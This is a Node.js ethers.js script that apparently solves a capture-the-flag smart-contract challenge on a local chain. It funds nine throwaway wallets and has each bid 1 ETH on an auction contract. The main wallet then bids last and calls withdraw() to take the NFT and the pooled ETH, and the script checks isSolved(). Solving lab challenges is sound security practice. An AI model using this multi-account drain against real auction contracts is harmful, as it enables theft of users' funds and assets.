// scripts/exploit_eoas.js
// DESTRUCTIVE: sends transactions to the network. Run on a local fork first if unsure.
require("dotenv").config()
const { ethers } = require("ethers")

const provider = new ethers.providers.StaticJsonRpcProvider(
  { url: process.env.RPC_URL, timeout: 30000 },
  { name: "hacktoday", chainId: 31337 }
)

const mainWallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider)

async function main() {
  if (!process.env.SETUP_CONTRACT_ADDR)
    throw new Error("SETUP_CONTRACT_ADDR not set in .env")

  const setupAddr = process.env.SETUP_CONTRACT_ADDR
  const setupAbi = [
    "function auction() view returns (address)",
    "function nft() view returns (address)",
    "function tokenId() view returns (uint256)",
    "function isSolved() view returns (bool)",
  ]
  const auctionAbi = [
    "function bid() external payable",
    "function withdraw() external",
    "function Balance() view returns (uint256)",
  ]
  const erc721Abi = ["function ownerOf(uint256) view returns (address)"]

  const setup = new ethers.Contract(setupAddr, setupAbi, provider)
  const auctionAddr = await setup.auction()
  console.log("auction:", auctionAddr)

  const auction = new ethers.Contract(auctionAddr, auctionAbi, provider)

  const tokenId = (await setup.tokenId()).toString()
  const nftAddr = await setup.nft()
  console.log("nft:", nftAddr, "tokenId:", tokenId)

  const needBidders = 9 // create 9 ephemeral EOAs, then our EOA will place final 1 ETH bid

  console.log(
    `Main wallet address (will fund ephemeral EOAs): ${mainWallet.address}`
  )
  console.log(
    "Main wallet ETH balance (wei):",
    (await provider.getBalance(mainWallet.address)).toString()
  )

  // 1) Create ephemeral wallets
  const ephemerals = []
  for (let i = 0; i < needBidders; i++) {
    const w = ethers.Wallet.createRandom().connect(provider)
    ephemerals.push(w)
    console.log(`ephemeral[${i}] address:`, w.address)
  }

  // 2) Fund each ephemeral with 1.02 ETH (1 ETH to bid + gas)
  const fundAmount = ethers.utils.parseEther("1.02")
  for (let i = 0; i < ephemerals.length; i++) {
    const to = ephemerals[i].address
    console.log(`Funding ephemeral ${i} (${to}) with 1.02 ETH...`)
    const tx = await mainWallet.sendTransaction({
      to,
      value: fundAmount,
      gasLimit: 21000,
    })
    await tx.wait()
    console.log(`  funded tx: ${tx.hash}`)
  }

  // 3) Have each ephemeral call auction.bid() with exactly 1 ETH
  for (let i = 0; i < ephemerals.length; i++) {
    const ep = ephemerals[i]
    const auctionFromEp = auction.connect(ep)
    console.log(
      `ephemeral ${i} (${ep.address}) calling auction.bid() with 1 ETH...`
    )
    const tx = await auctionFromEp.bid({
      value: ethers.utils.parseEther("1.0"),
      gasLimit: 300000,
    })
    const rec = await tx.wait()
    console.log(
      `  bid tx: ${tx.hash}, status: ${
        rec.status
      }, gasUsed: ${rec.gasUsed.toString()}`
    )
  }

  // 4) Confirm auction balance
  const balBefore = await auction.Balance()
  console.log(
    "auction.Balance() BEFORE our final bid =>",
    ethers.utils.formatEther(balBefore),
    "ETH"
  )

  // 5) Our main EOA places final 1 ETH bid (becomes lastBidder)
  const auctionFromMain = auction.connect(mainWallet)
  console.log("Main wallet placing final 1 ETH bid...")
  const txMainBid = await auctionFromMain.bid({
    value: ethers.utils.parseEther("1.0"),
    gasLimit: 300000,
  })
  await txMainBid.wait()
  console.log("main bid tx:", txMainBid.hash)

  // 6) Check auction balance now (should be 10 ETH)
  const balAfter = await auction.Balance()
  console.log(
    "auction.Balance() AFTER bids =>",
    ethers.utils.formatEther(balAfter),
    "ETH"
  )

  // 7) Call withdraw() from our main wallet (this will transfer NFT to lastBidder and send payout to msg.sender)
  console.log("Calling withdraw() from main wallet (DESTRUCTIVE) ...")
  const txWithdraw = await auctionFromMain.withdraw({ gasLimit: 500000 })
  const recWithdraw = await txWithdraw.wait()
  console.log("withdraw tx:", txWithdraw.hash, "status:", recWithdraw.status)

  // 8) Verify auction balance and NFT owner & isSolved
  const finalBal = await auction.Balance()
  console.log(
    "auction.Balance() AFTER withdraw =>",
    ethers.utils.formatEther(finalBal),
    "ETH"
  )

  const nft = new ethers.Contract(nftAddr, erc721Abi, provider)
  const owner = await nft.ownerOf(tokenId)
  console.log("nft.ownerOf(tokenId) =>", owner)

  try {
    const isSolved = await setup.isSolved()
    console.log("setup.isSolved() =>", isSolved)
  } catch (e) {
    console.log("setup.isSolved() reverted:", e.message)
  }

  console.log("DONE")
}

main().catch((err) => {
  console.error("exploit failed:", err)
  process.exit(1)
})
